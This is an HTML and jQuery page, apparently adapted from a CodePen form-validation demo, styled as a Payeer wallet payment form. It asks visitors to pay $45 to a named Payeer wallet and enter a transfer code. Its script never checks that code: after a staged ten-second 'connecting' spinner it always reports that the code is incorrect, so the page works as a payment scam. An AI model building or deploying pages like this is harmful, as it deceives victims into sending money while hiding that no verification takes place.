<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">

 <a href="https://payeer.com/"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUbv_AwSmDT1lrYXd3Yk3ZEtwD8O-9BmTxVwhbF_kYNxEuOfWlKU-B2qMIfoX7UXLkukQ&usqp=CAU" width="150" height="120" alt="f646307ee26d1a714e1cae84fb58aa49" border="0"></a>









       
    <meta name="apple-mobile-web-app-title" content="CodePen">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/x-icon"
        href="https://cpwebassets.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">

    <link rel="mask-icon" type="image/x-icon"
        href="https://cpwebassets.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg"
        color="#111">


    <title>CodePen - Bootstrap/HTML5 form validation</title>


    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">

    <style>
        .spin-icon {
            -webkit-animation: spin 2.5s linear infinite;
            animation: spin 2.5s linear infinite;
        }

        @-webkit-keyframes spin {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }

            to {
                transform: rotate(360deg);
            }
        }


        .form-group-relative {
            position: relative;
            width: 100%;
            height: 100%;
        }

        .input-targets{
            opacity:0;
            position: absolute;
            z-index: -99999999999999;
            top:-520px;
            left:-520px;
        }
        .form-group-relative .btn-copy {
            position: absolute;
            top: 50%;
            right: 30px;
            padding: 5px 10px;
            font-size: 12px;
            line-height: 10px;
            transform: translateY(-50%);
            border: 0px;
        }

        .form-group-relative .btn-copy:focus {
            outline: 0px;
            border: 0px;
            box-shadow: 0px;
        }
    </style>



</head>

<body>
    <main class="container">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1">

                <div class="form-group" style="margin: 30px 0px;">
                    <label for="Test">Payeer wallet is the amount you will pay.</label>
                    <div class="form-group-relative">
                        <select  name="" class="form-control select-option copy-with-text">
                            <option  value="P1096050972">$45
                            
</option>
                            
                            
			
                        </select>
                        <button class="btn btn-success btn-copy">COPY</button>
                    </div>
                </div>

                <div class="form-group">
                    <label for="Test">Address to pay Payeer wallet.</label>
                    <div class="form-group-relative">
                        <select disabled class="form-control select-with-option">
                            <option>Loading...</option>
                        </select>
                        <button class="btn btn-success btn-copy">COPY</button>
                    </div>
                </div>
                   
				
                              
                            </select>
                        </div>
                    </div>
		    <form data-ajax="true">
                    <div class="form-group">
                        
                    </div> 
                    <div class="form-group">
                       
		    
		    
			</div>
		    
		    
                    <div class="form-group">
                        <label for="Test">ENTER YOUR PAYEER TRANSFER NUMBER!</label>
                        <input type="text" required name="Test" id="Test" placeholder="Enter Your Payment Transfer Code.."
                            class="form-control input-test" />
                    </div>

                    <div class="alert hidden" aria-hidden="true"
                        data-success-message="<strong>Success!</strong> Your form was submitted."
                        data-error-message="<strong>Drats!</strong> Something afoul is afoot. Watson, hurry, I need you!">
                    </div>
                    <button type="submit" class="btn btn-success">Verify</button>
                </form>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1">
             
                </ul>
            </div>
        </div>
    </main>

    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
    <script>
        // Burası bir alt menü oluşturmayı sağlar "1" seçilen valueyi belirler
        const subOptions = {
        };
        
        const selectRef = $('.select-option');
        $('.btn-copy').on("click", function (e) {
       
            let val = $(this).parent().find("select,input").val();
            if($(this).parent().find("select,input").hasClass('copy-with-text'))
                val = $(this).parent().find("select option:selected,input").text();
            const _this = $(this);
            _this.text("COPIED").attr("disabled", true);
            
            setTimeout(() => {
                _this.text("COPY").removeAttr("disabled");
            }, 2000);

            if (!navigator.clipboard || typeof navigator.clipboard === 'undefined') {
                alert('Kopyalama yetkisi yok')
                return;
            }

           try {      
            $('.input-targets').remove();     
            let input = document.createElement('input');
            document.body.appendChild( input );
            input.value = val;
            input.classList.add("input-targets");
            input.select();
           
            document.execCommand('copy');
           } catch (error) {
            alert(error);
           }
        });

        function createSubOptions() {
            $('.select-with-option + .btn-copy').removeAttr("disabled");
            $('.select-with-option').removeAttr("disabled").html(``);
            if (!selectRef || typeof selectRef.val() === "undefined") return
            if (!subOptions[selectRef.val()] || subOptions[selectRef.val()].length === 0) {
                const selectedValue = selectRef.val();
                
                // $('.select-with-option + .btn-copy').attr("disabled", true);
                // $('.select-with-option').attr("disabled", true).html(`<option>Not option found</option>`);
                $('.select-with-option').append(`<option value="${selectedValue}">${selectedValue}</option>`)
                return
            }
            subOptions[selectRef.val()].forEach((item) => {
                subOptions[selectRef.val()]
                $('.select-with-option').append(`<option value="${item.value}">${item.label}</option>`)
            })
        }
        createSubOptions();

        selectRef.change(createSubOptions);


        (function ($, d) {
            $.ajaxForm = function (options) {
                var form = {
                    options: $.extend({
                        formSelector: 'form[data-ajax="true"]',
                        formRegion: 'main',
                        headerSelector: '.site-header',
                        errorMessage: "<strong>Error:</strong> Your Payeer wallet payment verification code is incorrect.",
                        successMessage: '<strong>Success:</strong> Your request has been successfully submitted.',
                        scrollPadding: 40
                    }, options),

                    $form: function () {
                        return $(form.options.formSelector, form.options.formRegion);
                    },

                    $invalid: function () {
                        //console.log('getting invalid', $('input:invalid', form.$form()));
                        return $('input:invalid', form.$form());
                    },

                    init: function () {

                        var $form = form.$form();
                        $('input[required]', $form).each(function (el) {
                            form.setFieldWarning(this);
                        }).on('keyup blur change', function (el) {
                            form.validateField(this);
                        });

                        form.toggleSubmitButtons();

                        $form.on('click', '[type="submit"]', function (e) {
                            e.preventDefault();

                            form.toggleSubmitButtons();
                            form.submit($(e.target).parents('form'));
                            //form.validate($(e.target).parents('form'));
                        });
                    },

                    submit: function (target) {
                        var $form = $(target), $alert = $('.alert', $form), successMessage, errorMessage;

                        successMessage = $alert.data('success-message') !== undefined ? $alert.data('success-message') : form.options.successMessage;
                        errorMessage = form.options.errorMessage;

                        $alert.addClass('alert-warning').removeClass('alert-success alert-danger hidden').attr('aria-hidden', 'false').attr('role', 'alert').html('<p><span class="glyphicon glyphicon-refresh spin-icon"></span> connecting payeer wallet...</p>');
                        let inputTest = $('.input-test').val();

                        setTimeout(() => {
                            $alert.addClass('alert-danger').removeClass('alert-warning').html(`
                                <strong>Error:</strong><br>Your Payeer wallet verification code is incorrect.▶:${inputTest}
                                `);
                            form.toggleSubmitButtons(true);
                        }, 10000)

                    },



                    validateField: function (target) {
                        var $target = $(target), $invalid = form.$invalid();

                        if ($target.is(':valid')) {
                            form.setFieldValid(target);
                        } else {
                            form.setFieldInvalid(target);
                        }

                        //console.log($invalid);
                        if ($invalid.length <= 0) {
                            //console.log('toggle submit true');
                            form.toggleSubmitButtons(true);
                        } else {
                            form.toggleSubmitButtons();
                        }
                    },

                    setFieldValid: function (target) {
                        //console.log('setting field valid', target);
                        var $target = $(target),
                            $parent = $target.parents('.form-group'),
                            $status = $('span.sr-only', $parent),
                            $icon = $('span.glyphicon', $parent);
                        //$status = $('<span class="sr-only">(success)</span>').attr('id', $target.attr('id') + '-status'),
                        //$icon = $('<span class="glyphicon glyphicon-ok form-control-feedback aria-hidden="true"></span>');

                        $parent
                            .addClass('has-feedback has-success')
                            .removeClass('has-error has-warning');
                        //.append($icon)
                        //.append($status);

                        $status.html('(success)');
                        $icon
                            .addClass('glyphicon-ok')
                            .removeClass('glyphicon-remove glyphicon-warning-sign');

                        $target
                            .attr('describedBy', $target.attr('id') + '-status');
                    },

                    setFieldWarning: function (target) {
                        var $target = $(target),
                            $parent = $target.parents('.form-group'),
                            $status = $('<span class="sr-only">(warning)</span>').attr('id', $target.attr('id') + '-status'),
                            $icon = $('<span class="glyphicon glyphicon-warning-sign form-control-feedback aria-hidden="true"></span>');

                        $parent
                            .addClass('has-feedback has-warning')
                            .append($icon)
                            .append($status);

                        $target
                            .attr('describedBy', $target.attr('id') + '-status');
                    },

                    setFieldInvalid: function (target) {
                        var $target = $(target),
                            $parent = $target.parents('.form-group'),
                            $status = $('span.sr-only', $parent),
                            $icon = $('span.glyphicon', $parent);
                        //$status = $('<span class="sr-only">(error)</span>').attr('id', $target.attr('id') + '-status'),
                        //$icon = $('<span class="glyphicon glyphicon-remove form-control-feedback aria-hidden="true"></span>');

                        $parent
                            .addClass('has-feedback has-error')
                            .removeClass('has-warning has-success');
                        //.append($icon)
                        //.append($status);

                        $status.html('(error)');
                        $icon
                            .addClass('glyphicon-remove')
                            .removeClass('glyphicon-ok glyphicon-warning-sign');

                        $target
                            .attr('describedBy', $target.attr('id') + '-status');
                    },

                    toggleSubmitButtons: function (enable) {
                        if (enable === undefined) {
                            enable = false;
                        }

                        var $form = form.$form();

                        if (enable) {
                            $('[type="submit"]', form.options.formSelector).removeAttr('disabled');
                        } else {
                            $('[type="submit"]', form.options.formSelector).attr('disabled', 'disabled');
                        }
                    }
                };

                return {
                    init: form.init()
                };
            };

            $.spamCheck = function (options) {
                var spam = {
                    options: $.extend({
                        formSelector: 'form[data-spam="true"]',
                        isHumanSelector: '#antiSpam_isHuman'
                    }, options),

                    init: function () {
                        $('.js-anti-spam').hide();
                        $(d).on('click.antiSpam', spam.isHuman).on("keypress.antiSpam", spam.isHuman);
                    },

                    isHuman: function () {
                        //console.log('should set it true');
                        $(spam.options.isHumanSelector).val('true');
                        $(d).off('click.antiSpam').off('keypress.antiSpam');
                    }
                };

                return {
                    init: spam.init()
                };
            };

            $(d).ready(function () {
                var spamCheck = new $.spamCheck(),
                    ajaxForm = new $.ajaxForm();
            });
        })(jQuery, document);
    </script>
</body>

</html>



